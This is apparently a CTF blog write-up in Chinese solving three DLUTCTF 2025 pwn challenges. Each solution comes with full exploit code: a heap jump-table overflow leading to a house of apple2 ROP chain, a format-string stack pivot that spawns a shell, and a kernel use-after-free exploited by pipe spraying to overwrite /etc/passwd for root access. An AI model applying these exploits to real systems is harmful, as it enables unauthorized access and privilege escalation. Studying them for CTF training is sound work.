---
title: DLUTCTF-2025-pwn 题解
date: 2026-04-27 10:50:00
tags: 
    - pwn
    - DLUTCTF2025
    - WriteUp
    - heap
    - house of apple2
    - orw
    - IO_FILE
    - 跳转表漏洞
    - 堆溢出
    - tcache poisoning
    - 堆喷射
    - kernel
    - 格式化字符串
categories: Contest
---
## heap_master

### checksec

```
[*] '/home/RatherHard/CTF-pwn/dlutctf2025/heap/heap_master'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### IDA

#### trace

```c
unsigned __int64 trace()
{
  int stat_loc; // [rsp+Ch] [rbp-A4h] BYREF
  unsigned int v2; // [rsp+10h] [rbp-A0h]
  __pid_t pid; // [rsp+14h] [rbp-9Ch]
  __int64 v4; // [rsp+18h] [rbp-98h]
  _BYTE v5[120]; // [rsp+20h] [rbp-90h] BYREF
  __int64 v6; // [rsp+98h] [rbp-18h]
  unsigned __int64 v7; // [rsp+A8h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  v2 = fork();
  if ( !v2 )
  {
    if ( prctl(1, 9) < 0 )
      error("prctl error");
    if ( ptrace(PTRACE_TRACEME, 0, 0, 0) )
      error("hack !!!!");
    pid = getpid();
    kill(pid, 19);
    func();
  }
  if ( waitpid(v2, &stat_loc, 0) < 0 )
    error("waitpid error1");
  alarm(0xFu);
  ptrace(PTRACE_SETOPTIONS, v2, 0, 1);
  do
  {
    ptrace(PTRACE_SYSCALL, v2, 0, 0);
    if ( waitpid(v2, &stat_loc, 0x40000000) < 0 )
      error("waitpid error2");
    if ( (stat_loc & 0x7F) == 0 || (_BYTE)stat_loc == 127 && BYTE1(stat_loc) == 11 )
      break;
    if ( ptrace(PTRACE_GETREGS, v2, 0, v5) < 0 )
      error("GETREGS error");
    v4 = v6;
    if ( v6 == 59 )
    {
      printf("bad syscall: %llu\n", 59);
      v6 = -1;
      if ( ptrace(PTRACE_SETREGS, v2, 0, v5) < 0 )
        error("SETREGS error");
    }
    ptrace(PTRACE_SYSCALL, v2, 0, 0);
    if ( waitpid(v2, &stat_loc, 0x40000000) < 0 )
      error("waitpid error3");
  }
  while ( (stat_loc & 0x7F) != 0 && ((_BYTE)stat_loc != 127 || BYTE1(stat_loc) != 11) );
  return v7 - __readfsqword(0x28u);
}
```

反调试、沙箱

不过自己 patch 一下就可以调试了

#### func

```c
void __noreturn func()
{
  int v0; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts("Don't worry, it's just an ordinary pwn.");
  puts("now tell me your name.");
  read(0, name, 0x100u);
  printf("hello,%s.\n", name);
  while ( 1 )
  {
    menu();
    read_int(&v0);
    switch ( v0 )
    {
      case 0:
      case 6:
        myexit(&v0, name);
      case 1:
        alloc();
        break;
      case 2:
        dele(&v0, name);
        break;
      case 3:
        show(&v0, name);
        break;
      case 4:
        edit(&v0, name);
        break;
      case 5:
        backdoor(&v0, name);
        break;
    }
  }
}
```

菜单逻辑

#### alloc

```c
unsigned __int64 alloc()
{
  unsigned int v1; // [rsp+8h] [rbp-18h] BYREF
  _DWORD size[3]; // [rsp+Ch] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  *(_QWORD *)&size[1] = 0;
  puts("tell me idx:");
  read_int(&v1);
  if ( v1 <= 0x1D )
  {
    puts("tell me size:");
    read_int(size);
    if ( size[0] <= 0x4FFu && size[0] > 7u )
    {
      *(_QWORD *)&size[1] = malloc(size[0]);
      if ( *(_QWORD *)&size[1] )
      {
        chunk_list[v1] = *(_QWORD *)&size[1];
        chunk_size[v1] = size[0];
      }
      puts("alloc down");
    }
  }
  return v3 - __readfsqword(0x28u);
}
```

#### dele

```c
unsigned __int64 dele()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("tell me idx:");
  read_int(&v1);
  if ( chunk_list[v1] && v1 <= 0x1E )
  {
    free((void *)chunk_list[v1]);
    chunk_list[v1] = 0;
    chunk_size[v1] = 0;
    puts("dele down");
  }
  return v2 - __readfsqword(0x28u);
}
```

#### show

```c
unsigned __int64 show()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("tell me idx:");
  read_int(&v1);
  if ( chunk_list[v1] && v1 <= 0x1E )
    write(1, (const void *)chunk_list[v1], (int)chunk_size[v1]);
  return v2 - __readfsqword(0x28u);
}
```

#### edit

```c
unsigned __int64 edit()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("tell me idx:");
  read_int(&v1);
  if ( chunk_list[v1] && v1 <= 0x1E )
  {
    puts("tell me context:");
    read(0, (void *)chunk_list[v1], chunk_size[v1] - 1);
    puts("dele down");
  }
  return v2 - __readfsqword(0x28u);
}
```

看不出有明显的堆漏洞

#### asm

```
.text:0000000000001AF6                 endbr64
.text:0000000000001AFA                 push    rbp
.text:0000000000001AFB                 mov     rbp, rsp
.text:0000000000001AFE                 sub     rsp, 10h
.text:0000000000001B02                 mov     rax, fs:28h
.text:0000000000001B0B                 mov     [rbp+var_8], rax
.text:0000000000001B0F                 xor     eax, eax
.text:0000000000001B11                 lea     rax, aDonTWorryItSJu ; "Don't worry, it's just an ordinary pwn."
.text:0000000000001B18                 mov     rdi, rax        ; s
.text:0000000000001B1B                 call    _puts
.text:0000000000001B20                 lea     rax, aNowTellMeYourN ; "now tell me your name."
.text:0000000000001B27                 mov     rdi, rax        ; s
.text:0000000000001B2A                 call    _puts
.text:0000000000001B2F                 lea     rsi, name       ; buf
.text:0000000000001B36                 mov     rdi, 0          ; fd
.text:0000000000001B3D                 mov     rdx, 100h       ; nbytes
.text:0000000000001B44                 call    _read
.text:0000000000001B49                 lea     rax, name
.text:0000000000001B50                 mov     rsi, rax
.text:0000000000001B53                 lea     rax, aHelloS    ; "hello,%s.\n"
.text:0000000000001B5A                 mov     rdi, rax        ; format
.text:0000000000001B5D                 mov     eax, 0
.text:0000000000001B62                 call    _printf
.text:0000000000001B67
.text:0000000000001B67 loc_1B67:                               ; CODE XREF: func:loc_1BEC↓j
.text:0000000000001B67                 push    rsi
.text:0000000000001B68                 mov     eax, 0
.text:0000000000001B6D                 call    menu
.text:0000000000001B72                 lea     rax, [rbp+var_C]
.text:0000000000001B76                 mov     rdi, rax
.text:0000000000001B79                 call    read_int
.text:0000000000001B7E                 pop     rsi
.text:0000000000001B7F                 mov     eax, [rbp+var_C]
.text:0000000000001B82                 mov     eax, eax
.text:0000000000001B84                 lea     rdx, ds:0[rax*4] ; switch 7 cases
.text:0000000000001B8C                 lea     rax, jpt_1BA2
.text:0000000000001B93                 mov     eax, ds:(jpt_1BA2 - 215Ch)[rdx+rax]
.text:0000000000001B96                 cdqe
.text:0000000000001B98                 lea     rdx, jpt_1BA2
.text:0000000000001B9F                 add     rax, rdx
.text:0000000000001BA2                 db      3Eh             ; switch jump
.text:0000000000001BA2                 jmp     rax
```

switch 针对 rax 不设校验，有跳转表的漏洞

跳转到哪里好呢？

```
.text:0000000000001B2F                 lea     rsi, name       ; buf
.text:0000000000001B36                 mov     rdi, 0          ; fd
.text:0000000000001B3D                 mov     rdx, 100h       ; nbytes
.text:0000000000001B44                 call    _read
```

想到利用 rsi 残留值跳到 1B36 处

经过动调发现 rsi 在经过 show 函数后会指向我们指定的 chunk ，那么利用跳转表漏洞就可以打堆溢出啦

跳转表的条目要写在 name 上（

最后就是 tcache poisoning -> house of apple2 的板子

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './heap_master_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

target = '60.205.163.215'
port = 13774

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

def safe_linking(pos, ptr):
    return (pos >> 12) ^ ptr

def jmp(idx):
    sla(b'input :', str(idx).encode())

def alloc(idx, size):
    sla(b'input :', b'1')
    sla(b'idx:', str(idx).encode())
    sa(b'size:', str(size).encode())

def dele(idx):
    sla(b'input :', b'2')
    sla(b'idx:', str(idx).encode())

def show(idx):
    sla(b'input :', b'3')
    sla(b'idx:', str(idx).encode())

def edit(idx, content):
    sla(b'input :', b'4')
    sla(b'idx:', str(idx).encode())
    sa(b'context:', content)

def exit():
    sla(b'input :', b'6')

sla(b'name.\n', b'\xda\xf9\xff\xff')

alloc(0, 0x80)
dele(0)
alloc(0, 0x80)
show(0)
heap = uu64(ru(b'\x05')[-5:]) << 12
leak('heap')

for i in range(1, 10):
    alloc(i, 0x80)
for i in range(0, 9):
    dele(i)
for i in range(0, 8):
    alloc(i, 0x80)
show(7)
libc.address = uru64() - 0x21adf0
leak('libc.address')

alloc(8, 0x80)
alloc(10, 0x18)
alloc(11, 0x18)
alloc(12, 0x18)
dele(12)
dele(11)
edit(10, b'OwO')
show(10)

jmp(1985)
payload = b'A' * 0x18 + p64(0x21) + p64(safe_linking(heap + 0xc50, heap + 0x100))
sl(payload)
alloc(13, 0xf8)
dele(13)
alloc(14, 0x18)
alloc(15, 0x18)
stderr = libc.sym['_IO_2_1_stderr_']
edit(15, p64(stderr))

alloc(16, 0xf8)
fake_io = flat({
        0x0: 0,
        0x10: b'flag\x00',
        0x28: libc.sym['setcontext'] + 0x3d,
        0x38: 0, # RDI
        0x40: stderr + 0x20, # RSI
        0x58: 0x400, # RDX
        0x70: stderr + 0x20, # RSP
        0X78: libc.sym['read'], # RIP
        0x88: stderr,
        0xA0: stderr - 0x30, # __rdx__
        0xB0: stderr - 0x40,
        0xD8: libc.sym['_IO_wfile_jumps']
    },
    filler=b"\x00"
)
edit(16, fake_io)

exit()

pop_rax_ret = libc.address + 0x45eb0
pop_rdi_ret = libc.address + 0x2a3e5
pop_rsi_ret = libc.address + 0x2be51
pop_rdx_pop_r12_ret = libc.address + 0x11f2e7
syscall_ret = libc.address + 0x91316

rop_chain = flat([
    pop_rax_ret,
    2,
    pop_rdi_ret,
    stderr + 0x10,
    pop_rsi_ret,
    0,
    syscall_ret,		# open("flag", 0, 0)
    pop_rax_ret,
    0,
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    stderr + 0x100,
    pop_rdx_pop_r12_ret,
    0x100,
    0,
    syscall_ret,		# read(3, buf, 0x100)
    pop_rax_ret,
    1,
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    stderr + 0x100,
    pop_rdx_pop_r12_ret,
    0x100,
    0,
    syscall_ret		# write(1, buf, 0x100)
])

s(rop_chain)

itr()

# 0x0000000000045eb0: pop rax; ret; 
# 0x000000000002a3e5: pop rdi; ret; 
# 0x000000000002be51: pop rsi; ret; 
# 0x000000000011f2e7: pop rdx; pop r12; ret;
# 0x0000000000091316: syscall; ret; 

```

## fmt

### checksec

```
[*] '/home/RatherHard/CTF-pwn/dlutctf2025/fmt/fmt'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

应该是很简单的栈

### IDA

#### main

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("you have one chance .");
  read(0, &buf, 0x100u);
  func1((__int64)&buf);
  return 0;
}
```

#### func1

```c
int __fastcall func1(const char *a1)
{
  return func2(a1);
}
```

#### func2

```c
int __fastcall func2(const char *a1)
{
  int result; // eax

  result = flag;
  if ( flag == 1 )
  {
    result = printf(a1);
    flag = 0;
  }
  return result;
}
```

### 攻击思路

格式化字符串打栈， func 套了两层，那么栈迁移一下就行啦

尝试用了 pwntools 的神奇 rop 工具，挺好用的

有时间打算去看看 pwncli

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './fmt_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

target = '60.205.163.215'
port = 13774

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

fake_stack = 0x4040a0 + 0x80
back = 0x401252
payload = b'%' + str(fake_stack - 0x8).encode() + b'c%8$ln;%3$p'
payload = payload.ljust(0x80, b'\x00')
payload += p64(back)
sa(b'chance .', payload)
ru(b';0x')
libc.address = int(r(12).decode('utf-8'), 16) - 0x1147e2
leak('libc.address')

bin_sh = next(libc.search(b'/bin/sh'))
chain = ROP(libc)
chain.execve(bin_sh, 0, 0)
payload = b'A' * 0x80 + chain.chain()

s(payload)
itr()
```

## ker

第一道内核题

### IDA

#### ioctl

```c
__int64 __fastcall module_ioctl(file *__file, __int64 cmd, unsigned __int64 param)
{
  unsigned int v3; // edx
  unsigned int v4; // r12d
  __int64 v5; // rbx
  _QWORD *v7; // rax

  _fentry__();
  v4 = v3;
  raw_spin_lock(&spin);
  switch ( (_DWORD)cmd )
  {
    case 0xFFFF:
      kfree(buffer);
      buffer = 0;
      break;
    case 0xDEADBEEF:
      if ( v4 <= 0x400 )
        *((_BYTE *)buffer + (v4 >> 3)) ^= 1 << (v4 & 7);
      break;
    case 0x1000:
      v7 = buffer;
      if ( !buffer )
      {
        v7 = (_QWORD *)kmalloc_trace(kmalloc_caches[262], 0x400CC0, 1024);
        buffer = v7;
        if ( !v7 )
        {
          v5 = -1;
          goto LABEL_5;
        }
      }
      *v7 = 0;
      v7[127] = 0;
      memset(
        (void *)((unsigned __int64)(v7 + 1) & 0xFFFFFFFFFFFFFFF8LL),
        0,
        8LL * (((unsigned int)v7 - (((_DWORD)v7 + 8) & 0xFFFFFFF8) + 1024) >> 3));
      break;
  }
  v5 = 0;
LABEL_5:
  raw_spin_unlock(&spin);
  return v5;
}
```

有位翻转

#### open

```c
__int64 __fastcall module_open(inode *__inode, file *__file)
{
  _fentry__();
  raw_spin_lock(&spin);
  if ( buffer )
    goto LABEL_2;
  buffer = (void *)kmalloc_trace(kmalloc_caches[262], 0x400CC0, 1024);
  if ( buffer )
  {
    memset(buffer, 0, 0x400u);
LABEL_2:
    raw_spin_unlock(&spin);
    return 0;
  }
  return 0xFFFFFFFFLL;
}
```

打开设备时往全局变量 buffer 上写入指向堆区的指针，但如果 buffer 非空则不做操作

#### release

```c
__int64 __fastcall module_release(inode *__inode, file *__file)
{
  _fentry__();
  raw_spin_lock(&spin);
  if ( buffer )
    kfree(buffer);
  raw_spin_unlock(&spin);
  return 0;
}
```

close 时会 free ，结合上面的 open 产生了 UAF

### 攻击思路

听学长的建议去了解了一下 DirtyPipe

发现这题用 DirtyPipe 很好打，甚至不用做 rop 或者绕各种保护

有了 UAF 就把 pipe_buffer 喷上去，然后用位翻转改 flag 就能去写任意文件了

然后去改 /etc/passwd 的 root 密码， su 一下就能提权

有空会去复现一下相关 CVE

### 经验总结

这道题只申请一个 pipe_buffer 可能命中不了，所以需要多申请几个，这就是堆喷射: Heap Spray

fd 被 close 后就没了，想用 ioctl 的话需要再次 open

### exp

```c
#include "kernelpwn.h"

#define CMD_CLEAN 0xFFFF
#define CMD_ALLOC 0x1000
#define CMD_EDIT  0xDEADBEEF

int spraycount = 50;

int main() {
    printf("Enter spraycount:");
    scanf("%d", &spraycount);
    bind_core(0);

    int file_fd = open("/etc/passwd", O_RDONLY);
    
    int fd = open("/dev/kernel_master", O_RDWR);
    close(fd);

    int pipe_fds[spraycount][2];
    for (int i = 0; i < spraycount; i++) {
        pipe(pipe_fds[i]);
        splice(file_fd, NULL, pipe_fds[i][1], NULL, 1, SPLICE_F_MOVE);
    }

    int fd2 = open("/dev/kernel_master", O_RDWR);
    ioctl(fd2, CMD_EDIT, (24 << 3) + 4);

    const char *data = "oot::0:0:root:/root:/bin/sh\n";
    for (int i = 0; i < spraycount; i++) {
        write(pipe_fds[i][1], data, strlen(data));
    }

    return 0;
}
```